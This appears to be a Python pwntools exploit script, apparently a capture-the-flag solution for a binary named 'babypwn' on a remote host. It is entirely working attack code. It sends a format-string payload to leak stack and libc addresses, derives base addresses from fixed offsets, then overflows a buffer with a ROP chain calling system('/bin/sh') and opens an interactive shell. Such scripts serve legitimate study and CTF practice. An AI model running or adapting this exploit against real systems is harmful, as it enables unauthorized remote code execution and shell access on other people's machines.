from pwn import *
import time
payload = b"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"


libc = ELF('./libc.so.6')
system_offset = libc.symbols['system']
binsh_offset = next(libc.search(b'/bin/sh\x00'))

print("/bin/sh offset: ",hex(binsh_offset))
print("system() offset: ", hex(system_offset))

pop_rdi = 0x00000000000051d1
pop_rsi = 0x0000000000005105
pop_rax = 0x0000000000006be3
call_rax = 0x0000000000005014
pop_rax = 0x0000000000006be3
ret = 0x000000000000501a

glibc_system = 0x0000000000052290

#stack_subtract = 0x1a1be
stack_subtract = 0x38ec0
libc_subtract = 0x24083

#p = process("./babypwn")
p = remote("be.ax",31801)
p.recv()

p.sendline(b"%79$p_%87$p")
leak = p.recvline()[4:-1]
(stack, libc) = leak.split(b'_')

leak_addr = int(stack, 16)
print("---------")
print("Leaked stack address:",hex(leak_addr))
base_addr = leak_addr-stack_subtract
print("Base stack address:",hex(base_addr))
print("")
leak_libc_addr = int(libc, 16)
print("Leaked libc address:",hex(leak_libc_addr))
base_libc_addr = leak_libc_addr-libc_subtract
print("Base libc address:",hex(base_libc_addr))

print("---------")
print("POP RDI gadget address: ",hex(base_addr+pop_rdi))
print("/bin/sh address: ",hex(base_libc_addr+binsh_offset))
print("system() address: ",hex(base_libc_addr+system_offset))
payload += p64(base_addr+ret)



# ret to account for stack alignment
payload += p64(base_addr+pop_rdi)

# The real deal here
payload += p64(base_libc_addr+binsh_offset)
payload += p64(base_libc_addr+system_offset)

p.sendline(payload)

p.interactive()
